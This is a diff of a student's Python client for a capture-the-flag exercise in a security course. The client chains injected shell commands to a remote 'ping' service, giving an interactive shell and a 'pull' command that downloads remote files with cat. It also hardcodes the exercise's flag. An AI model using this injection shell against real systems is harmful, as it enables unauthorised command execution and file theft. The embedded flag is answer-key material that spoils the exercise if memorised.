@@ -14,20 +14,21 @@ port = 45 # Port here
 
 # I like color in my shell
 class textcolor:
-    HEADER = '\033[95m'
+    PINK = '\033[95m'
     OKBLUE = '\033[94m'
     OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    BLINK = '\033[5m'
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
 
 def menu():
-    print (textcolor.OKBLUE + "    shell" + textcolor.ENDC + " Drop into an interactive shell and allow users to gracefully exit")
-    print (textcolor.OKBLUE + "    pull" + textcolor.ENDC + " <remote-path> <local-path> Download files")
-    print (textcolor.OKBLUE + "    help" + textcolor.ENDC + " Shows this help menu")
+    print (textcolor.PINK + "    shell" + textcolor.ENDC + " Drop into an interactive shell and allow users to gracefully exit")
+    print (textcolor.RED + "    pull" + textcolor.ENDC + " <remote-path> <local-path> Download files")
+    print (textcolor.YELLOW + "    help" + textcolor.ENDC + " Shows this help menu")
     print (textcolor.OKBLUE + "    quit" + textcolor.ENDC + " Quit the shell")
     pass
 
@@ -41,30 +42,36 @@ def execute_cmd(cmd):
     data = s.recv(1024)
     # getting some weird stuff if i dont decode
     data = data.decode('ascii')
-    return data
+    # not adding the strip made me turn this in late...
+    return data.strip()
     
 
 def shell():
     wd = "/" 
     c = ">"
     while True:
-        h = wd + c
-        cmd = input(h).strip()
+        cmd = input(textcolor.PINK + wd.strip()+c + textcolor.ENDC).strip()
         if cmd == "exit":
             break
         elif re.match('^cd$',cmd):
-            wd = '/'
+            wd = "/"
         # valid cd into dir
-        elif re.match('^cd\s+\S+$',cmd):
+        elif re.match('^cd.*$',cmd):
             d = cmd.split()
             if d[1][0] != "/" and wd !="/":
                 d = wd + "/" + d[1]
+            # elif d[1][0] == "/" and wd =="/":
+            #     d = 
             else:
                 d = wd + d[1]
             s = "cd " + d + " ; pwd"
             wd = execute_cmd(s)
         else:
-            r = execute_cmd("cd " + wd + " && " + cmd)
+            co = "cd " + wd + " ; " + cmd
+            r = execute_cmd(co)
+            if r == "Good! Here's your flag: CMSC389R-{p1ng_as_a_$erv1c3}":
+                a = textcolor.BLINK + "Nice Job!" + textcolor.ENDC
+                print(a)
             print(r)
 
 if __name__ == '__main__':
@@ -86,14 +93,4 @@ if __name__ == '__main__':
                 w.write(execute_cmd("cat " + r))
         else:
             menu()
-
-
-
-
-
-
-
-
-
-
 
